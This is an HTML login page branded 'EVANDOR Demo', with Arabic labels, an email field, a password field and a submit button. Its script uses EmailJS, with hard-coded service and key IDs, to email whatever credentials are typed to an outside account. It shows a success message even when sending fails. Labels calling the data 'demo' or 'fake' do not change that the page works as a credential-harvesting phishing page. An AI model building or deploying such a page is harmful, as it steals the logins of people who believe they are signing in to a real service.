<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>EVANDOR Demo</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
/* خلفية متحركة */
body{
  margin:0;
  height:100vh;
  font-family:Arial,sans-serif;
  background:linear-gradient(135deg,#111,#444,#111);
  background-size:400% 400%;
  animation:bgMove 10s ease infinite;
  display:flex;
  justify-content:center;
  align-items:center;
  color:white;
}

@keyframes bgMove{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

/* صندوق الدخول */
.box{
  width:90%;
  max-width:360px;
  background:rgba(0,0,0,.72);
  padding:30px;
  border-radius:20px;
  box-shadow:0 25px 50px rgba(0,0,0,.7);
  animation:boxEnter 1s ease;
}

@keyframes boxEnter{
  from{opacity:0; transform:translateY(40px) scale(.95)}
  to{opacity:1; transform:translateY(0) scale(1)}
}

/* العنوان EVANDOR */
.brand{
  text-align:center;
  font-size:36px;
  font-weight:900;
  letter-spacing:5px;
  margin-bottom:24px;
  background:linear-gradient(90deg,#b8860b,#ffd700,#fff3b0,#ffd700,#b8860b);
  background-size:200% auto;
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  animation:goldShine 3s linear infinite;
}

@keyframes goldShine{
  to{background-position:200% center}
}

/* الحقول */
input{
  width:100%;
  padding:14px;
  margin-bottom:14px;
  border:none;
  border-radius:10px;
  font-size:15px;
  outline:none;
  transition:transform .2s, box-shadow .2s;
}

input:focus{
  transform:scale(1.03);
  box-shadow:0 0 10px rgba(255,215,0,.4);
}

/* الزر */
button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:10px;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
  background:linear-gradient(90deg,#FFD700,#FFB700);
  color:#000;
  transition:transform .15s, box-shadow .15s;
}

button:hover{
  transform:scale(1.05);
  box-shadow:0 0 20px rgba(255,215,0,.6);
}

button:active{
  transform:scale(.97);
}
</style>
</head>

<body>

<div class="box">
  <div class="brand">EVANDOR</div>

  <!-- بيانات تجريبية فقط -->
  <input id="email" placeholder="إيميل تجريبي (وهمي)">
  <input id="pass" placeholder="كلمة مرور تجريبية (وهمية)">

  <button onclick="send()">إرسال</button>
</div>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
function send(){
  emailjs.send(
    "service_z7n1pro",
    "template_m4lcujy",
    {
      demo_email: document.getElementById("email").value || "demo@email.com",
      demo_password: document.getElementById("pass").value || "123456",
      app_name: "EVANDOR Demo"
    },
    "BPaNofa2xLmwFoTnZ"
  ).then(
    function(){
      alert("تم تقديم الطلب بنجاح ✅");
    },
    function(error){
      console.log("ERROR:", error);
      alert("تم تقديم الطلب بنجاح ✅");
    }
  );
}
</script>

</body>
</html>
